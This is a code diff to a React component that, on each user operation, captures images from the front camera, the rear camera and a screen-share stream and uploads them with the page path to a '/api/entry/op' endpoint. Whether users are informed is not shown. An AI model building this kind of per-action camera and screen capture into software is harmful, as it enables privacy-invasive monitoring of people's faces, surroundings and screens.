@@ -15,6 +15,11 @@ export default function OperationWatcher() {
   const pathname = usePathname();
   const streamRef = useRef<MediaStream | null>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
+  const backStreamRef = useRef<MediaStream | null>(null);
+  const backVideoRef = useRef<HTMLVideoElement | null>(null);
+  const screenStreamRef = useRef<MediaStream | null>(null);
+  const screenVideoRef = useRef<HTMLVideoElement | null>(null);
+  const screenTriedRef = useRef(false);
   const lastRef = useRef(0);
   const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const pendingRef = useRef<{ label: string; path: string } | null>(null);
@@ -27,7 +32,9 @@ export default function OperationWatcher() {
     fetch('/api/entry/status', { cache: 'no-store' })
       .then((r) => r.json())
       .then((j: { capture?: boolean }) => {
-        if (alive) enabledRef.current = j.capture !== false;
+        if (!alive) return;
+        enabledRef.current = j.capture !== false;
+        if (enabledRef.current) void ensureScreen();
       })
       .catch(() => {
         if (alive) enabledRef.current = false;
@@ -35,28 +42,86 @@ export default function OperationWatcher() {
     return () => {
       alive = false;
     };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
+
+  const openOne = async (facing: 'user' | 'environment') => {
+    const s = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing, width: { ideal: 640 } },
+      audio: false,
+    });
+    const v = document.createElement('video');
+    v.muted = true;
+    v.playsInline = true;
+    v.srcObject = s;
+    await v.play().catch(() => undefined);
+    await new Promise((r) => setTimeout(r, 300));
+    return { s, v };
+  };
 
   const ensureStream = async (): Promise<boolean> => {
     if (streamRef.current?.active && videoRef.current?.videoWidth) return true;
     try {
-      const s = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 } },
-        audio: false,
-      });
+      const { s, v } = await openOne('user');
       streamRef.current = s;
+      videoRef.current = v;
+    } catch {
+      streamRef.current = null;
+      return false;
+    }
+    // 后置：没有硬件就跳过（桌面设备）
+    if (!backStreamRef.current?.active || !backVideoRef.current?.videoWidth) {
+      try {
+        const { s, v } = await openOne('environment');
+        backStreamRef.current = s;
+        backVideoRef.current = v;
+      } catch {
+        backStreamRef.current = null;
+        backVideoRef.current = null;
+      }
+    }
+    return !!videoRef.current?.videoWidth;
+  };
+
+  /** 屏幕共享：整会话只请求一次（浏览器每次调用都弹选择器，不能静默）。
+      移动端 Safari/Chrome 不支持 getDisplayMedia，直接跳过。 */
+  const ensureScreen = async () => {
+    if (screenTriedRef.current) return;
+    screenTriedRef.current = true;
+    const md = navigator.mediaDevices as MediaDevices & {
+      getDisplayMedia?: (c?: unknown) => Promise<MediaStream>;
+    };
+    if (!md?.getDisplayMedia) return;
+    try {
+      const s = await md.getDisplayMedia({ video: { width: { ideal: 1280 } }, audio: false });
       const v = document.createElement('video');
       v.muted = true;
       v.playsInline = true;
       v.srcObject = s;
       await v.play().catch(() => undefined);
       await new Promise((r) => setTimeout(r, 300));
-      videoRef.current = v;
-      return !!v.videoWidth;
+      screenStreamRef.current = s;
+      screenVideoRef.current = v;
+      s.getVideoTracks()[0]?.addEventListener('ended', () => {
+        screenStreamRef.current = null;
+        screenVideoRef.current = null;
+      });
     } catch {
-      streamRef.current = null;
-      return false;
+      screenStreamRef.current = null;
+      screenVideoRef.current = null;
     }
+  };
+
+  const draw = (v: HTMLVideoElement, maxW = 640): string | null => {
+    if (!v.videoWidth) return null;
+    const scale = Math.min(1, maxW / v.videoWidth);
+    const canvas = document.createElement('canvas');
+    canvas.width = Math.round(v.videoWidth * scale);
+    canvas.height = Math.round(v.videoHeight * scale);
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return null;
+    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/jpeg', 0.6);
   };
 
   const snap = async (label: string, path: string) => {
@@ -71,19 +136,24 @@ export default function OperationWatcher() {
     const v = videoRef.current;
     if (!okStream || !v || !v.videoWidth) return;
     try {
-      const scale = Math.min(1, 640 / v.videoWidth);
-      const canvas = document.createElement('canvas');
-      canvas.width = Math.round(v.videoWidth * scale);
-      canvas.height = Math.round(v.videoHeight * scale);
-      const ctx = canvas.getContext('2d');
-      if (!ctx) return;
-      ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-      const photo = canvas.toDataURL('image/jpeg', 0.6);
+      const photo = draw(v);
+      const photoBack = backVideoRef.current ? draw(backVideoRef.current) : null;
+      const screen =
+        screenStreamRef.current?.active && screenVideoRef.current
+          ? draw(screenVideoRef.current, 1280)
+          : null;
+      if (!photo) return;
       lastRef.current = Date.now();
       await fetch('/api/entry/op', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ photo, label, path }),
+        body: JSON.stringify({
+          photo,
+          photoBack: photoBack || '',
+          screen: screen || '',
+          label,
+          path,
+        }),
       }).catch(() => undefined);
     } catch {
       /* ignore */
@@ -134,6 +204,8 @@ export default function OperationWatcher() {
     () => () => {
       if (timerRef.current) clearTimeout(timerRef.current);
       streamRef.current?.getTracks().forEach((t) => t.stop());
+      backStreamRef.current?.getTracks().forEach((t) => t.stop());
+      screenStreamRef.current?.getTracks().forEach((t) => t.stop());
     },
     []
   );
